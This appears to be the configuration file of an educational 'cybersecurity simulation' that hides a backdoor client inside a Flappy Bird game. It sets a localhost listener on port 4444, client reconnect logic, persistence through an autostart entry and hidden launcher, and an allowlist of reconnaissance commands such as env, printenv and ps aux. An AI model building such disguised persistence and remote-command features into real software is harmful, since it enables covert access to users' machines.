"""
Flappy Flight - Shared Configuration
All configurable values for the Flappy Flight cybersecurity simulation.
"""

import os

# ─── Network Configuration ───
LISTENER_HOST = "127.0.0.1"
LISTENER_PORT = 4444

# ─── Application Metadata ───
APP_NAME = "Flappy Flight"
PERSISTENCE_NAME = "flappyflight"
VERSION = "1.0.0"

# ─── Paths ───
HOME_DIR = os.path.expanduser("~")
AUTOSTART_DIR = os.path.join(HOME_DIR, ".config", "autostart")
INSTALL_DIR = os.path.join(HOME_DIR, ".local", "share", PERSISTENCE_NAME)
AUTOSTART_ENTRY = os.path.join(AUTOSTART_DIR, f"{PERSISTENCE_NAME}.desktop")
LAUNCHER_SCRIPT = os.path.join(INSTALL_DIR, f"{PERSISTENCE_NAME}_launcher.sh")

# ─── Project Root ───
PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))

# ─── Allowed Commands (safe commands only) ───
ALLOWED_COMMANDS = [
    "whoami", "hostname", "ls", "pwd", "uname", "date",
    "id", "uptime", "df", "cat /etc/os-release",
    "echo", "env", "printenv", "arch", "uname -a",
    "ls -la", "ls -l", "who", "w", "last", "ps aux",
    "ifconfig", "ip addr", "netstat", "ss",
]

# ─── Client Settings ───
RECONNECT_DELAY = 5        # Initial reconnection delay in seconds
MAX_RECONNECT_DELAY = 60   # Maximum reconnection delay
BUFFER_SIZE = 4096         # Socket buffer size

# ─── Game Settings ───
SCREEN_WIDTH = 400
SCREEN_HEIGHT = 600
FPS = 60
GAME_TITLE = f"{APP_NAME} - Flappy Bird"
